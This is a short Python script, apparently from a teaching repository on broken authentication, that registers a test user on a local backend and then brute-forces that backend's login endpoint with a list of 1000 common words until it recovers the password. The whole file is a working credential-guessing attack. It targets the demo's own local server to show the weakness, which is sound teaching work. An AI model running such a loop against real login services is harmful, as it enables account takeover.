import json
import requests


BACKEND_URL = "http://0.0.0.0:5004"

# Add new user
payload = {"email": "test@gmail.com", "password": "city"}
response = requests.request(
    "POST",
    f"{BACKEND_URL}/user",
    data=json.dumps(payload),
    headers={"content-type": "application/json"},
)

# brute_force
payload = {"email": "test@gmail.com", "password": ""}
stolen_password = ""

with open("examples/broken_authentication/most_common_1000_words.txt", "r") as file:
    lines = file.readlines()
    for line in lines:
        payload["password"] = line.strip()
        response = requests.request(
            "POST",
            f"{BACKEND_URL}/login",
            data=json.dumps(payload),
            headers={"content-type": "application/json"},
        )
        if response.json()["answer"] != "error":
            stolen_password = payload["password"]
            break

print(stolen_password)
